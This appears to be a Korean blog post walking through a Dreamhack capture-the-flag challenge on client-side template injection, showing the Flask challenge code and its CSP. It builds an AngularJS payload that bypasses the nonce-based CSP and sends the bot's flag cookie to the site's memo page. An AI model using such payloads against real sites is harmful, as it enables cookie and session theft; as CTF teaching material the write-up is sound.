---
title: (32) Dreamhack Client Side Template Injection
date: 2024-02-07 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 풀이
![](https://kyuyeop.github.io/assets/img/post/32/1.png)
많이 보더 페이지군요.  
  
코드부터 후딱 봅시다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)


app.run(host="0.0.0.0", port=8000)
```
늘 보던 형태의 코드입니다. flag페이지에 입력한 url로 쿠키로 flag를 가지고 있는 chrome driver로 접속하는 방식이죠.  
  
이번 코드에는 CSP가 있네요. nonce가 있는걸로 봐서 script태그를 이용할 수도 없고, img-src도 걸려있네요. 근데 눈에 띄는게 하나 있습니다.
```
script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com;
```
바로 ajax를 사용할 수 있도록 되어 있다는 점 입니다. 문제가 csti이니 ajax관련 라이브러리중 [AngularJS](https://angularjs.org/)를 이용하는 문제입니다.  
AngularJS는, 제공하는 태그를 붙여놓으면 `{{ 코드 }}`를 해석해서 출력해준답니다. 이걸 사용하면 nonce없이 실행이 가능합니다.  
  
구글에 angularjs xss payload를 검색해보니
```
{{constructor.constructor('alert(1)')()}}
```
이런 예제가 나옵니다. 서버의 chrome driver가 쿠키를 들고 memo 페이지에 방문하도록 만들어야 하기 때문에
```
{{constructor.constructor("location.href='memo?memo='+document.cookie")()}}
```
이런 페이로드를 이용할 겁니다.  
따라서
```
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app>{{ constructor.constructor("location.href='memo?memo='+document.cookie")() }}</div>
```
를 flag페이지에 넣으면
![](https://kyuyeop.github.io/assets/img/post/32/2.png)
`/memo`에 들어가보면 flag가 있습니다.
{% endraw %}